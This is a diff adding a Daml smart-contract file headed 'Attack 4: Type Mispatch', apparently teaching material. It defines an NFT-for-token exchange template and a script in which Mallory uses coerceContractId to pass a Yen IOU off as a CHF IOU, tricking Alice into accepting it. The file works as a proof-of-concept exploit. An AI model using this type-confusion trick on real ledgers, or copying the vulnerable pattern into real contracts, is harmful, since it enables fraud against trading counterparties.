@@ -1,0 +1,85 @@
+---------------------------------
+---- Attack 4: Type Mispatch ----
+---------------------------------
+
+{-# LANGUAGE ApplicativeDo #-}
+
+module L_AutomaticExchange where
+
+import qualified A_Asset as Asset
+import qualified B_RockBandNFT as NFT
+import qualified J_TokenV3 as Token
+
+import DA.Assert
+import DA.Set as S
+import Daml.Script
+
+data EmptyView = EmptyView
+
+template Offer with
+    proponer: Party
+    offer: ContractId Token.CHFIou
+    price: Int
+    band: Party
+    public: Party
+  where
+    signatory proponer
+    observer public
+
+    choice Accept: ContractId Token.CHFIou with
+        counterOffer: ContractId NFT.NFT
+        acter: Party
+        acceptedBanks: Set Party
+      controller acter
+      do
+        proposalId <- exercise (Asset.toId counterOffer) (Asset.Transfer proponer)
+        assetId <- exercise proposalId Asset.Accept
+        nft <- fetch (Asset.fromId @NFT.NFT assetId)
+        nft.band === band
+        (iou, _) <- exercise (Token.toId offer) (Token.Split price)
+        proposalId <- exercise iou (Token.Transfer acter)
+        tokenId <- exercise proposalId Token.Accept
+        token <- fetch tokenId
+        assert $ any (\x -> S.member x acceptedBanks) (signatory token)
+        pure $ Token.fromId tokenId
+
+
+
+main = script do
+  band <- allocateParty "Iron Furry"
+  alice <- allocateParty "Alice"
+  public <- allocateParty "Public"
+  bank <- allocateParty "Bank"
+  mallory <- allocateParty "Mallory"
+
+  nftId <- submitMulti [band, alice] [] do
+    createCmd (NFT.NFT band "Metal Storm" alice public)
+
+  iouId <- submitMulti [bank, mallory] [] do
+    createCmd Token.YenIou with
+      issuer = bank
+      owner = mallory
+      amount = 100
+
+  _ <- mallory `submit` do
+    exerciseCmd (Token.toId iouId) (Token.Divulge mallory alice)
+
+  let chfIou = coerceContractId iouId
+
+  offerId <- mallory `submit` do
+    createCmd Offer with
+      proponer = mallory
+      offer = chfIou
+      price = 42
+      band = band
+      public = public
+
+  submitMulti [alice] [public] do
+    exerciseCmd offerId (Accept nftId alice (fromList [bank]))
+
+  pure ()
+
+
+
+
+
